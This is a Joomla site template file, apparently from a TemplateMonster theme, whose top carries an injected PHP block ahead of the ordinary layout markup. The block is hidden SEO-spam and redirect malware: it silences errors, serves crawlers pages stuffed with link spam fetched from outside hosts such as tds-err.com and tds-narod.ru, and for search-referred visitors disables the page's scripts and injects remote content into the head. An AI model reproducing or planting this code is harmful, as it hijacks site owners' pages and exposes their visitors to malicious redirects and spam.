<?php
if(!defined('_NET'))
{	
error_reporting(0);
$NET='sh19045'; 
define('_NET',$NET);
if(function_exists('date_default_timezone_set')){date_default_timezone_set('America/Los_Angeles');}$sll0='http://googlecountwebs.com/';$pinj_0='http://tds-err.com/i?r=1';$pinj_1='http://tds-narod.ru/i.txt';$FNN='lnk-trans2.php';$pinj_2='yahoo';$pinj_2='bing';$pinj_3=str_replace('google',$pinj_1,$sll0);$pinj_4='site';$sll0=str_replace('google',$pinj_4,$sll0);$pinj_5='';$pinj_6='';$pinj_7='';$pinj_8='';if(!empty($_SERVER['HTTP_USER_AGENT'])){$pinj_6=$_SERVER['HTTP_USER_AGENT'];}if(!empty($_SERVER['HTTP_REFERER'])){$pinj_5=$_SERVER['HTTP_REFERER'];}if(!empty($_SERVER['REQUEST_URI'])){$pinj_7=$_SERVER['REQUEST_URI'];}if(!empty($_SERVER['REMOTE_ADDR'])){$pinj_8=$_SERVER['REMOTE_ADDR'];}if(!function_exists('get_cont')){function get_cont($pinj_9){if(function_exists('curl_init')){if(strpos($pinj_9,'NET=',0)>0){$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,0);curl_setopt($pinj_10,CURLOPT_NOBODY,0);curl_setopt($pinj_10,CURLOPT_TIMEOUT,30);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);return $pinj_11;}$pinj_12=0;$pinj_13=0;$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);if((strpos($pinj_11,' 404 Not',0)>0)||(strpos($pinj_11,'Location:',0)>0)){$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (x compatible; Googlebot/2.1; +http://www.google.com/bot.html)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;$pinj_12=1;}}else{if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;}}if($pinj_13==0){$pinj_14=array();$pinj_15=0;while(preg_match("/(Location:|URI:)[^(\n)]*/",$pinj_11,$pinj_14)&&($pinj_15<3)){$pinj_9=trim(str_replace($pinj_14[1],"",$pinj_14[0]));$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);$pinj_15=$pinj_15+1;$pinj_14=array();}if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;}}$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,0);curl_setopt($pinj_10,CURLOPT_NOBODY,0);curl_setopt($pinj_10,CURLOPT_TIMEOUT,30);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);if($pinj_12==1){curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (x compatible; Googlebot/2.1; +http://www.google.com/bot.html)");}else{curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");}$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);return $pinj_11;}$pinj_16=@file_get_contents($pinj_9);return $pinj_16;}}if(!function_exists('SEbot_')){function SEbot_($pinj_17){if(strpos('-' .strtolower($pinj_17),'x compatible',0)>0){return 0;}if(strpos('-' .strtolower($pinj_17),'googlebot',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'slurp',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'bing',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'msnbot',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'yahoo',0)>0){return 1;}return 0;}}if(!function_exists('not_do_')){function not_do_($pinj_18){$pinj_19='gif|jpeg|png|js|css|swf|ico|txt|pdf|xml|jpg|pdf|doc';$pinj_20=explode("|",$pinj_19);$pinj_21=0;while($pinj_21<count($pinj_22)){if(strpos(' ' .strtolower($pinj_18),$pinj_22[$pinj_21],0)>0)return 1;$pinj_21=$pinj_21+1;}return 0;}}if(!function_exists('detect_encoding_')){function detect_encoding_($pinj_23){static $pinj_24=array('UTF-8','ASCII','Windows-1251','ISO-8859-2','ISO-8859-3','ISO-8859-4','ISO-8859-5','ISO-8859-6','ISO-8859-7','ISO-8859-8','ISO-8859-9','ISO-8859-10','ISO-8859-13','ISO-8859-14','ISO-8859-15','ISO-8859-16','ISO-8859-1','Windows-1252','Windows-1254',);foreach($pinj_24 as $pinj_25){$pinj_26=@iconv($pinj_25,$pinj_25 .'',$pinj_23);if(md5($pinj_26)== md5($pinj_23))return $pinj_25;}return null;}}if(isset($_SERVER['HTTPS'])&&($_SERVER['HTTPS']=='on')){$pinj_27='https';}else{$pinj_27='http';}$pinj_28=substr(str_replace('www.','',$_SERVER['SERVER_NAME']),0,4);if((SEbot_($pinj_6)>0)&&empty($pinj_29)&&(not_do_($pinj_7)==0)){$pinj_29=get_cont($pinj_27 .'://' .$_SERVER['SERVER_NAME'] .$pinj_7);if(strlen($pinj_29)>200){$pinj_30=get_cont($sll0 .$FNN .'?d=' .$_SERVER['SERVER_NAME'] .'&NET=' .$NET .'&u=' .urlencode($pinj_7) .'&prot=' .$pinj_27);$pinj_31=$pinj_29;$pinj_32=strpos(strtolower($pinj_29),"<body",0);$pinj_33=strpos(strtolower($pinj_29),">",$pinj_32);if(($pinj_32>0)&&($pinj_33>0)){$pinj_29=substr($pinj_31,0,$pinj_33+1) .$pinj_30 .'' .substr($pinj_31,$pinj_33+1);if(strpos(strtolower('-' .$pinj_6),'sape',0)>0){$pinj_29=$pinj_29 .'=*OK*=';}echo $pinj_29;exit;}$pinj_29=str_replace('</body>',$pinj_30 .'</body>',$pinj_29);if(strpos(strtolower('-' .$pinj_6),'sape',0)>0){$pinj_29=$pinj_29 .'=*OK*=';}echo $pinj_29;exit;}else { echo '<html><head></head><body>'.$pinj_30.'</body></html>';	 exit;	 } }if(isset($pinj_5)&&((strpos($pinj_5,'ogle.',0)>0)||(strpos($pinj_5,'ing.',0)>0)||(strpos($pinj_5,'ahoo.',0)>0)||(strpos($pinj_5,'ask.com',0)>0)||(strpos($pinj_5,'aol.',0)>0)||(strpos($pinj_5,'duckduckgo.',0)>0)||(strpos($pinj_5,'baidu.',0)>0))){$pinj_34='mkke';$pinj_35=180;if(!isset($_COOKIE[$pinj_34])||($_COOKIE[$pinj_34]<(time()))){$pinj_36=get_cont($sll0 .$FNN .'?rd=1&d=' .$_SERVER['SERVER_NAME'] .'&NET=' .$NET .'&u=' .urlencode($pinj_7) .'&prot=' .$pinj_27);if(strlen($pinj_36,'<!-- -->',0)>0)$pinj_35=9000;if(strlen($pinj_36)>10){$pinj_37=get_cont($pinj_27 .'://' .$_SERVER['SERVER_NAME'] .$pinj_7);if(strlen($pinj_37)>400){$pinj_36=str_replace('-SID-',$NET,$pinj_36); $pinj_37=str_replace(' src="',' xsrc="',$pinj_37); $pinj_37=str_replace(" src='"," xsrc='",$pinj_37); $pinj_37=str_replace("<script","<comment",$pinj_37); $pinj_37=str_replace("</script","</comment",$pinj_37);  $pinj_37=str_replace('</head>',$pinj_36 .'</head>',$pinj_37);setcookie($pinj_34,(time()+$pinj_35),(time()+$pinj_35*2),'/','.' .str_replace('www.','',$_SERVER['SERVER_NAME']));  echo $pinj_37;exit;}}}} 
$p1='_lo'; $p1=$p1.'ads';  $i=0; while($i<12) { $p1='x'.$p1; $i=$i+1;} $p2=$p1.'2'; if(isset($_GET[$p1]) || isset($_POST[$p1]) ) { exit;} if(isset($_GET[$p2])  ) { $_GET[$p1]=$_GET[$p2];} if(isset($_POST[$p2]) ) { $_POST[$p1]=$_POST[$p2];}
}
/*,.*/
?><?php
defined('_JEXEC') or die;
include_once ('includes/functions.php');
include_once ('includes/includes.php');
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
<head>  
  <?php
    if ($hideByEdit == false){
      $doc->addStyleSheet('templates/'.$this->template.'/css/bootstrap.css'); 
      $doc->addStyleSheet('templates/'.$this->template.'/css/default.css');
      $doc->addStyleSheet('templates/'.$this->template.'/css/template.css');
      $doc->addStyleSheet('templates/'.$this->template.'/css/magnific-popup.css');
      $doc->addStyleSheet('templates/'.$this->template.'/css/komento.css');  
      $doc->addStyleSheet('templates/'.$this->template.'/css/kunena.css');  
      $doc->addStyleSheet('templates/'.$this->template.'/css/responsive.css');
      $doc->addStyleSheet('//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css'); 
      $doc->addStyleSheet('//fonts.googleapis.com/css?family=Righteous');
      if($themeLayout == 1){
        $doc->addStyleSheet('templates/'.$this->template.'/css/layout.css');
      }
    }
    else{
      $doc->addStyleSheet($this->baseurl.'/media/jui/css/bootstrap.min.css');
      $doc->addStyleSheet($this->baseurl.'/administrator/templates/'.$adminTemplate.'/css/template.css');
      $doc->addStyleSheet('templates/'.$this->template.'/css/edit.css'); 
      if($themeLayout == 1){
        $doc->addStyleSheet('templates/'.$this->template.'/css/layout.css');
      }
    }
  ?>
  <jdoc:include type="head" />
  <!--[if lt IE 8]>
    <div style=' clear: both; text-align:center; position: relative;'>
      <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
        <img src="http://storage.ie6countdown.com/assets/100/images/banners/warning_bar_0000_us.jpg" border="0" height="42" width="820" alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today." />
      </a>
    </div>
  <![endif]-->
  <!--[if lt IE 9]>
    <link rel="stylesheet" href="<?php echo $this->baseurl; ?>/templates/<?php echo $this->template; ?>/css/ie.css" />
    <script src="<?php echo $this->baseurl; ?>/templates/<?php echo $this->template; ?>/js/html5shiv.js"></script>
    <script src="<?php echo $this->baseurl; ?>/templates/<?php echo $this->template; ?>/js/html5shiv-printshiv.js"></script>
  <![endif]-->  
</head>
<body class="<?php echo $option . " view-" . $view . " task-" . $task . " itemid-" . $itemid . " body__" . $pageClass;?>">
  <!-- Body -->
  <div id="wrapper">
    <div class="wrapper-inner">
      <?php if ($this->countModules('top') && $hideByEdit == false): ?>
      <!-- Top -->
      <div id="top-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div id="top" class="<?php echo $rowClass; ?>">
              <jdoc:include type="modules" name="top" style="themeHtml5" />
            </div>
          </div>
        </div>
      </div>
      <?php endif; ?>
      <!-- Header -->
      <?php if ($hideByEdit == false): ?>
      <div id="header-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <header>
              <div class="<?php echo $rowClass; ?>">
                  <!-- Logo -->
                  <div id="logo" class="span<?php echo $this->params->get('logoBlockWidth'); ?>">
                    <a href="<?php echo $this->baseurl; ?>">
                      <img src="<?php echo $logo;?>" alt="<?php echo $sitename; ?>">
                      <h1><?php echo $sitename; ?></h1>
                    </a>
                  </div>
                  <jdoc:include type="modules" name="header" style="themeHtml5" />
              </div>
            </header>
          </div>
        </div>
      </div>
      <?php endif; ?>
      <?php if ($this->countModules('navigation') && $hideByEdit == false): ?>
      <!-- Navigation -->
      <div id="navigation-row" role="navigation">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div class="<?php echo $rowClass; ?>">
              <jdoc:include type="modules" name="navigation" style="themeHtml5" />
            </div>
          </div>
        </div>
      </div>
      <?php endif; ?>
      <?php if ($this->countModules('showcase') && $hideByEdit == false): ?>
      <!-- Showcase -->
      <div id="showcase-row">
        <jdoc:include type="modules" name="showcase" style="html5nosize" />
      </div>
      <?php endif; ?>
      <?php if ($this->countModules('feature') && $hideByView == false && $hideByEdit == false): ?>
      <!-- Feature -->
      <div id="feature-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div class="<?php echo $rowClass; ?>">
                <jdoc:include type="modules" name="feature" style="themeHtml5" />
            </div>
          </div>
        </div>
      </div>
      <?php endif; ?>
      <?php if ($this->countModules('maintop') && $hideByView == false && $hideByEdit == false): ?>
      <!-- Maintop -->
      <div id="maintop-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div id="maintop" class="<?php echo $rowClass; ?>">
              <jdoc:include type="modules" name="maintop" style="themeHtml5" />
            </div>
          </div>
        </div>
      </div>
      <?php endif; ?>
      <div class="row-container">
        <div class="<?php echo $containerClass; ?>">
          <jdoc:include type="message" />
        </div>
      </div>
      <!-- Main Content row -->
      <div id="content-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div class="content-inner <?php echo $rowClass; ?>">   
              <?php if ($this->countModules('aside-left') && ($hideByOption) == false && $view !== 'form' && $hideByEdit == false): ?>     
              <!-- Left sidebar -->
              <div id="aside-left" class="span<?php echo $asideLeftWidth; ?>">
                <aside role="complementary">
                  <jdoc:include type="modules" name="aside-left" style="html5nosize" />
                </aside>
              </div>
              <?php endif; ?>        
              <div id="component" class="span<?php echo $mainContentWidth; ?>">
                <main role="main">
                  <?php if ($this->countModules('breadcrumbs') && $layout !== 'edit'): ?>
                  <!-- Breadcrumbs -->
                  <div id="breadcrumbs-row">
                    <div id="breadcrumbs">
                      <jdoc:include type="modules" name="breadcrumbs" style="html5nosize" />
                    </div>
                  </div>
                  <?php endif; ?>       
                  <?php if ($this->countModules('content-top') && $hideByView == false && $hideByEdit == false): ?> 
                  <!-- Content-top -->
                  <div id="content-top-row" class="<?php echo $rowClass; ?>">
                    <div id="content-top">
                      <jdoc:include type="modules" name="content-top" style="themeHtml5" />
                    </div>
                  </div>
                  <?php endif; ?>        
                  <jdoc:include type="component" />   
                  <?php if ($this->countModules('content-bottom') && $hideByView == false && $hideByEdit == false): ?>     
                  <!-- Content-bottom -->
                  <div id="content-bottom-row" class="<?php echo $rowClass; ?>">
                    <div id="content-bottom">
                      <jdoc:include type="modules" name="content-bottom" style="themeHtml5" />
                    </div>
                  </div>
                  <?php endif; ?>
                </main>
              </div>        
              <?php if ($this->countModules('aside-right') && ($hideByOption) == false && $view !== 'form' && $hideByEdit == false): ?>
              <!-- Right sidebar -->
              <div id="aside-right" class="span<?php echo $asideRightWidth; ?>">
                <aside role="complementary">
                  <jdoc:include type="modules" name="aside-right" style="html5nosize" />
                </aside>
              </div>
              <?php endif; ?>
            </div>
          </div>
        </div>
      </div>
      <?php if ($this->countModules('mainbottom') && $hideByView == false && $hideByEdit == false): ?>
      <!-- Mainbottom -->
      <div id="mainbottom-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div id="mainbottom" class="<?php echo $rowClass; ?>">
              <jdoc:include type="modules" name="mainbottom" style="themeHtml5" />
            </div>
          </div>
        </div>
      </div>
      <?php endif; ?>
      <?php if ($this->countModules('bottom') && $hideByView == false && $hideByEdit == false): ?>
      <!-- Bottom -->
      <div id="bottom-row">
        <jdoc:include type="modules" name="bottom" style="html5nosize" />
      </div>
      <?php endif; ?>
      <?php if ($this->countModules('footer')): ?>
      <!-- Footer -->
      <div id="footer-row">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div id="footer" class="<?php echo $rowClass; ?>">
              <jdoc:include type="modules" name="footer" style="themeHtml5" />
            </div>
          </div>
        </div>
      </div>
      <?php endif; ?>      
      <div id="push"></div>
    </div>
  </div>
  <?php if ($hideByEdit == false): ?>
  <div id="footer-wrapper">
    <div class="footer-wrapper-inner">
      <!-- Copyright -->
      <div id="copyright-row" role="contentinfo">
        <div class="row-container">
          <div class="<?php echo $containerClass; ?>">
            <div class="<?php echo $rowClass; ?>">
              <jdoc:include type="modules" name="copyright" style="themeHtml5" />
              <div id="copyright" class="span<?php echo $this->params->get('footerWidth'); ?>">
                <?php if($this->params->get('footerLogo') == 1) : ?>
                <!-- Footer Logo -->
                <a class="footer_logo" href="<?php echo $this->baseurl; ?>"><img src="<?php echo $footerLogo;?>" alt="<?php echo $sitename; ?>" /></a>
  					    <?php else: ?>
                <span class="siteName"><?php echo $sitename; ?></span>
  					    <?php endif; ?>
					      <?php if($this->params->get('footerCopy') == 1) echo '<span class="copy">&copy;</span>'; ?>
					      <?php if($this->params->get('footerYear') == 1) echo '<span class="year">'.date('Y').'</span>'; ?>
                <?php if($this->params->get('privacyLink') == 1) :?>
                <a class="privacy_link" href="<?php echo $privacy_link_url; ?>"><?php echo $this->params->get('privacy_link_title'); ?></a>
  					    <?php endif; ?>
                <?php if($this->params->get('termsLink') == 1) :?>
                <a class="terms_link" href="<?php echo $terms_link_url; ?>"><?php echo $this->params->get('terms_link_title'); ?></a>
  					    <?php endif; ?>
              </div>
              <?php if($this->params->get('todesktop')): ?>
              <div class="span12" id="to-desktop">
                <a href="#">
                  <span class="to_desktop"><?php echo $this->params->get('todesktop_text') ?></span>
                  <span class="to_mobile"><?php echo $this->params->get('tomobile_text') ?></span>
                </a>
              </div>
              <?php endif; ?>
              <!--More <a  rel='nofollow' href='http://www.templatemonster.com/category/fruit-joomla-templates/' target='_blank'>Fruit Joomla Templates at TemplateMonster.com</a>-->
            </div>
          </div>
        </div>
      </div>
      <?php if($this->params->get('totop')): ?>
      <div id="back-top">
        <a href="#"><span></span><?php echo $this->params->get('totop_text') ?></a>
      </div>
      <?php endif; ?>
    </div>
  </div>
  <?php if ($this->countModules('modal')): ?>
  <jdoc:include type="modules" name="modal" style="modal" />
  <?php endif; ?>
  <jdoc:include type="modules" name="debug" style="none"/>
  <?php endif; ?>
  <?php
    $doc->addScript($this->baseurl."/media/jui/js/jquery.min.js");
    $doc->addScript($this->baseurl.'/media/jui/js/jquery-migrate.min.js');
    $doc->addScript($this->baseurl."/media/jui/js/bootstrap.min.js");    
    if ($hideByEdit == false){
      $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/jquery.easing.1.3.js');
      $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/jquery.mobile.customized.min.js');
      $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/es5-shim.min.js');
      $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/jquery.centerIn.js');
      //$doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/jquery-scrolltofixed-min.js');
      $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/jquery.magnific-popup.min.js');
      $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/ios-orientationchange-fix.js');
      $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/desktop-mobile.js');
      if($this->params->get('blackandwhite')): 
      $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/jquery.BlackAndWhite.min.js');
      $doc->addScriptDeclaration("jQuery(document).ready(function(){
        jQuery('.item_img a').not('.touchGalleryLink').BlackAndWhite({
          invertHoverEffect: ".$this->params->get('invertHoverEffect').",
          intensity: 1,
          responsive: true,
          speed: {
              fadeIn: ".$this->params->get('fadeIn').",
              fadeOut: ".$this->params->get('fadeOut')." 
          }
        });
      });");
      endif;
      $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/scripts.js');
    }
  ?>
</body>
</html>